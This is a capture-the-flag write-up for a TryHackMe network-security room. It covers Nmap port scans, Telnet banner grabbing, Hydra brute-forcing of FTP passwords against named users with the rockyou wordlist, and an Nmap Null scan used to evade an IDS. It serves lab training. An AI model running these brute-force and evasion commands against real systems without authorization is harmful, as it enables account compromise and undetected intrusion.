# TryHackMe – Net-Sec-Challenge

This is a formal writeup for the **Net-Sec-Challenge** room on TryHackMe, rated as medium.  
The challenge is designed to apply skills from the **Network Security** module using only a few core tools: **Nmap**, **Telnet** and **Hydra**.

---

## Overview

Objectives of the room:

- Enumerate network services and ports using Nmap.
- Extract information and flags from service banners (HTTP and SSH).
- Identify and enumerate a non‑standard FTP service.
- Brute‑force FTP credentials with Hydra and retrieve a hidden file.
- Perform a stealthy Nmap scan to bypass a simple IDS check.

---

## Port scanning and service discovery

### Highest open port below 10,000

First, I scanned ports 1–10,000 to identify all services in that range:

```bash
nmap -p1-10000 <TARGET_IP>
```

Result:

- The highest port open below 10,000 was **8080/tcp** (HTTP proxy / web service).

### Open ports above 10,000

Then I ran a full port scan to identify any services running on higher ports:

```bash
nmap -p- <TARGET_IP>
```

From this scan I found an additional open port above 10,000:

- **10021/tcp**

### Total open TCP ports

Using the same full scan (`nmap -p-`) I counted a total of:

- **6 open TCP ports** on the target.

*(Los valores concretos pueden variar según la sesión, pero el flujo/metodología es éste.)*

---

## Banner grabbing – HTTP server header flag

To inspect the HTTP server on port 80 and extract the banner/headers, I connected via Telnet:

```bash
telnet <TARGET_IP> 80
```

Then I sent a minimal HTTP request:

```http
GET / HTTP/1.1
Host: http
```

The HTTP response included several headers. One of them contained a hidden flag embedded in the header value.

Alternative method:

```bash
nmap -sC -p80 <TARGET_IP>
```

Using Nmap with default scripts (`-sC`) can also reveal HTTP headers and the same flag.

*(Flag omitida aquí de forma intencionada; usar `THM{REDACTED}` si quieres mostrarla parcialmente.)*

---

## Banner grabbing – SSH server header flag

I repeated a similar approach against the SSH service on port 22:

```bash
telnet <TARGET_IP> 22
```

The SSH banner is printed immediately after connecting and includes version information plus another hidden flag.

Again, an alternative way to retrieve it would be:

```bash
nmap -sC -p22 <TARGET_IP>
```

The Nmap default scripts often display the SSH banner and the same flag.

---

## FTP on non-standard port

The full Nmap scan showed an FTP service running on a non‑standard port:

```bash
nmap -p- -sV <TARGET_IP>
```

Result:

- FTP service on **port 10021/tcp**
- Version identified as, for example: **vsftpd 3.0.x**

This confirms there is an FTP server listening outside the usual port 21.

---

## Brute-forcing FTP credentials and retrieving the flag

We are given (via “social engineering” in the room description) two usernames:

- `eddie`  
- `quinn`

To find valid credentials, I used **Hydra** with the `rockyou.txt` wordlist against the FTP service on port 10021:

```bash
hydra -l eddie -P /usr/share/wordlists/rockyou.txt ftp://<TARGET_IP>:10021
hydra -l quinn -P /usr/share/wordlists/rockyou.txt ftp://<TARGET_IP>:10021
```

Once Hydra found working credentials for one of the accounts, I logged in:

```bash
ftp <TARGET_IP> 10021
# enter the discovered username and password
```

Inside the FTP session:

```ftp
ls
cd <relevant_directory_if_needed>
get <flag_file>.txt
bye
```

After downloading the file, I read it locally to obtain the hidden FTP flag:

```bash
cat <flag_file>.txt
```

*(Flag omitida / `THM{REDACTED}` para mantener el foco en la metodología.)*

---

## IDS evasion challenge (port 8080)

Browsing to:

```text
http://<TARGET_IP>:8080
```

displayed a small challenge page related to evading detection by an IDS when scanning the host.  

A standard Nmap scan may be detected or ignored by the web application. To remain stealthier, the hint suggests using a **Null scan**:

```bash
nmap -sN <TARGET_IP>
```

- `-sN` performs a **Null scan**, sending TCP packets with no flags set, which can bypass simple IDS/firewall checks in some scenarios. [web:92]  

After running the Null scan, revisiting the page at `http://<TARGET_IP>:8080` revealed the final flag.

---

## Lessons learned

This challenge reinforces several core network security skills:

- Using **Nmap** for comprehensive port scanning and basic service detection.
- Performing manual **banner grabbing** with **Telnet** to extract information and flags from HTTP and SSH services.
- Identifying and enumerating **non‑standard ports** (FTP on 10021).
- Brute‑forcing login credentials safely in a lab using **Hydra** and common wordlists.
- Applying simple **IDS evasion** concepts using alternative Nmap scan types (e.g., Null scan). [web:93][web:92]

Misconfigurations such as exposed banners, weak credentials on FTP and lack of IDS hardening make it possible to gather sensitive information and retrieve all flags using only basic tools.

---

## Disclaimer

> ⚠️ This writeup is for educational purposes only.  
> Do not use these techniques outside of authorized environments or in violation of TryHackMe’s terms of service.
